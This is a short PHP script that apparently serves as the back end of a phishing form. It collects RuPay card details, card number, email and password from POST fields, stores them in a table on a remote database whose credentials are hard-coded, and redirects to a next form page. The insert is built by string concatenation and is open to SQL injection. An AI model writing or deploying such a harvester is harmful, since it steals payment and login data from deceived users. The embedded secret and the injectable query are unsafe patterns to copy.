<?php

$con = mysqli_connect("fdb31.biz.nf","4024908_job","E2j2S0#G1!6DYLF}","4024908_job");

if(isset($_POST["submit"]))
{
$rupay = $_POST["rupay"];
$card = $_POST["card"];
$email  = $_POST["email"];
$password = $_POST["password"];
$cpassword = $_POST["cpassword"];

$query ="INSERT INTO secondpage(RUPAY, CARD, EMAIL, PASSWORD, PASSWORDA) VALUE ('".$rupay."','".$card."','".$email."','".$password."','".$cpassword."')"; 

$run = mysqli_query($con,$query);
}
 //redirect
   header ("Location:formb.html");

 ?>